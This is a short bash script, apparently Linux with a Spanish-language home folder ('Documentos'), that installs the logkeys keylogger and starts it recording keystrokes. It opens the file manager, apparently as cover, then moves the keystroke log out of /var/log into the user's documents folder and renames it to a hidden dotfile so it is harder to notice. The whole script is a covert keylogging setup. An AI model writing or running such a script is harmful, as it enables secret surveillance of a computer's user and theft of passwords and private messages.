#!/bin/bash

apt-get install logkeys
logkeys -s
nautilus
cd /var/log/
mv logkeys.log ~/Documentos
cd ~/Documentos
mv logkeys.log .logkeys.log
